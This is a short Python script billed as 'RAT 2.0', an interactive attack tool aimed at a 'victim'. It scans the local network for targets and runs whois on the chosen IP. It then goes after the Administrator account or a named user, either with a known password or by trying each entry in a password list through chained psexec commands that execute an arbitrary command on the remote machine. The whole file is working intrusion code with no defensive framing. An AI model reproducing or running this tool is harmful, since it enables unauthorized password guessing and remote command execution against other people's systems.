import cmd_executor as cmd

print('welcome to RAT 2.0')

x = input("do you know the ip address of your victim[y/n]: ")

if x == 'n':
 no = 0
 ipl = cmd.scan_network()
 print('--------ok scanning current network--------')
 for ip in ipl:
  no = no + 1
  print('ip no.'+str(no)+ ': '+ip)
 print('    you can choose a target from above.    ')
 print('---------------scan-complete---------------')
else:
 print('ok continuing')

ip = input("what is the ip of your victim: ")

ip_s = input("do you want to do a whois scan on your target[y/n]: ")

if ip_s == 'n':
 print('ok moving on')
else:
 print(cmd.whois(ip))

y = input('do you want to target a specific user or go for the default(admin)[default/username]: ')

if y == 'default':
 user = 'Administrator'
else:
 user = y

z = input("do you know the password or do you want to use hash attack[1/2]: ")

if z == '1':
 pwd = input("what is the password: ")
else:
 print('ok moving on to hash attack')
 pt = input("do you want to use pass or big_pass[1/2]: ")
 if pt == '1':
  f = open("pass.txt",'r+')
 elif pt == '2':
  f = open("big_pass.txt",'r+')
 l = f.readlines()
 o = []
 for i in l:
  o.append(i.replace('\n',''))

c = input('what command do you want to run: ')

if z == '1':
 cmd.remote_execute(ip,user,pwd,c)
else:
 num = 0
 exec_string = ''
 for p in o:
  num = num + 1
  print('on pass number '+str(num))
  if num == 1:
   exec_string = 'psexec \\\\{}'.format(ip)+' -u {}'.format(user)+' -p {}'.format(p)+" "+c
  else: 
   exec_string = exec_string + str(' & psexec \\\\{}'.format(ip)+' -u {}'.format(user)+' -p {}'.format(p)+" "+c)
 cmd.execute_command(exec_string, False, False)
 